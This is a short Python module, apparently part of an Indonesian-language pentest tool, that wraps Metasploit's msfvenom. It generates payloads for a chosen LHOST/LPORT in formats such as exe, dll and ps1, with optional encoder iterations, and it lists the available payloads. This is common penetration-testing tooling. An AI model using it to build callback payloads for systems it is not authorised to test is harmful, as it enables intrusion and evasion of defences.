# src/paymod/handler.py
import subprocess
from typing import Tuple

def generate_payload(payload_type: str, lhost: str, lport: str, 
                     output_format: str, output_file: str, 
                     encoder: str = 'none', 
                     iterations: int = 1) -> Tuple[bool, str]:
    """
    Generate payload menggunakan msfvenom.
    Return (success, message).
    """
    valid_formats = ['exe', 'elf', 'raw', 'python', 'c', 'perl', 'ruby', 'dll', 'vba', 'ps1']
    if output_format not in valid_formats:
        return False, f"Format '{output_format}' tidak valid. Gunakan: {', '.join(valid_formats)}"

    cmd = [
        'msfvenom',
        '-p', payload_type,
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', output_format,
        '-o', output_file
    ]
    if encoder and encoder != 'none':
        cmd.extend(['-e', encoder, '-i', str(iterations)])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode == 0:
            return True, f"Payload berhasil dibuat: {output_file}\n{result.stdout}"
        else:
            return False, f"Error msfvenom: {result.stderr}"
    except FileNotFoundError:
        return False, "msfvenom tidak ditemukan. Pastikan Metasploit Framework terinstall."
    except subprocess.TimeoutExpired:
        return False, "Timeout saat menjalankan msfvenom."
    except Exception as e:
        return False, f"Error: {e}"

def list_payloads(filter_text: str = "") -> str:
    """Daftar payload msfvenom (opsional filter)."""
    try:
        cmd = ['msfvenom', '-l', 'payloads']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            payloads = result.stdout
            if filter_text:
                lines = payloads.split('\n')
                filtered = [line for line in lines if filter_text.lower() in line.lower()]
                return '\n'.join(filtered) if filtered else "Tidak ada payload yang cocok."
            return payloads
        else:
            return f"Error: {result.stderr}"
    except Exception as e:
        return f"Error: {e}"
